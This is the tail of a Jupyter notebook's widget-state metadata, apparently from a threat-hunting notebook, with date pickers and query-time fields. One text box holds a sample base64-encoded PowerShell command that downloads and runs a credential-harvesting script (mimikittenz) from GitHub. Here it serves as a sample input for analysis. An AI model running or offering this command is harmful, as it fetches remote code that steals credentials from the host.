     "dfdb867f4b464317af9f5081fa13a1bf": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_83e842dbf50645ffb3f0f11b73e143ec",
       "style": "IPY_MODEL_f1cb5c888fa047fda5752d996421a2a2",
       "value": {
        "date": 27,
        "month": 9,
        "year": 2022
       }
      }
     },
     "e4dbbccd17964e6589ab84a8af5f173a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "e634cd129ddf49028a04bebcf28087ce": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_37abfc7d54a0401e87719166e710740d",
        "IPY_MODEL_7ca4c9a21b0445a489f866c1352c0704"
       ],
       "layout": "IPY_MODEL_7cd58c5fd7f045dd91eb9326210196c8"
      }
     },
     "e6c6872e81f241ff8ddf4b98ba5e173b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "e916c03fdc2649e4ba93b9c60b3bd337": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "100px"
      }
     },
     "e9207e9c067148dcbc68bdb8e5af7cbc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "eab2fd56dfdc4cddbbdc4c6da1849a1b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "eaf6de7549be4dc681e449e869e1a656": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "ed0b4e1f49924f97845f0693a1b99cca": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "ed848349d2eb4975afc8fcaaa25d3586": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "ee9a7d1a10ef4cd08134263a65aa106e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "100px"
      }
     },
     "ef01455a7f364cc2a28f96a10bb5891d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "99%"
      }
     },
     "ef20c7238a68490eaf25801df3e4020f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "f024bd1bd4ee47908fc53c7c9957339e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_6ff9933ac1ea4573a2ee3fff0cfdb4e9",
        "IPY_MODEL_df27833b710d4f46a31d57caec4b682e",
        "IPY_MODEL_1bb1eb20d0e04ab59fbd9ccf904ba5cd"
       ],
       "layout": "IPY_MODEL_9a81a9335c484d878b45b5916c2a7b19"
      }
     },
     "f1cb5c888fa047fda5752d996421a2a2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "f391bc2b5f1045db81d092b3dca97fee": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "f46bb6405df645d0bfbe1df6d29fbcec": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range",
       "layout": "IPY_MODEL_93ef5e76ae1c4c60bf0e2af57413524d",
       "max": 28,
       "min": -28,
       "style": "IPY_MODEL_cd50151307ff4f31be93c5a778e9e222",
       "value": [
        -1,
        1
       ]
      }
     },
     "f5bb3f446da6430eab2d790ad8409c51": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_b17de6a0ab1b48e89fdaddc84ac129da",
       "style": "IPY_MODEL_23f1c66b68d848f6809a03d8afa1cfaf",
       "value": "2022-10-26 14:34:59.175155"
      }
     },
     "f7102cc0b01641b793f5277ea2bcf25e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "f927e658ead64e81a7cb506458b9e4af": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "fa505a7c675646968b58db8bf288c2e2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_6d478178b55145c0b00b53794076c1ac",
       "style": "IPY_MODEL_83f0559c3f884b479757b292bee3339c",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "fb1f218239af49f6a7522336d25733d9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_650a1d920c634369a39ef4b7b12fb8be",
       "style": "IPY_MODEL_3708397ee4af40f0ae9a725559ad8f45",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "fd1302df9f8c4af9862b7129b805b712": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Enter a commandline with powershell base64 encoded",
       "layout": "IPY_MODEL_ef20c7238a68490eaf25801df3e4020f",
       "style": "IPY_MODEL_8e01ee34a789449ba21033e746d6f751",
       "value": "powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg=="
      }
     },
     "fdbc746325f34499bcf450ee0a732093": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "ff1c7e576594462099db3d58fdc37a8d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_050e07af2a3e45088f13fa138f4ec908",
       "style": "IPY_MODEL_82ca5746c0314105994198bf21837f39",
       "value": "2022-10-26 15:37:14.642408+00:00"
      }
     },
     "ffaa3370e6d1480a97c276045e78f017": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_62c23d6111f84760917e15ee96497ebd",
       "style": "IPY_MODEL_eab2fd56dfdc4cddbbdc4c6da1849a1b",
       "value": "2022-10-28 15:37:14.351231"
      }
     }
    },
    "version_major": 2,
    "version_minor": 0
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
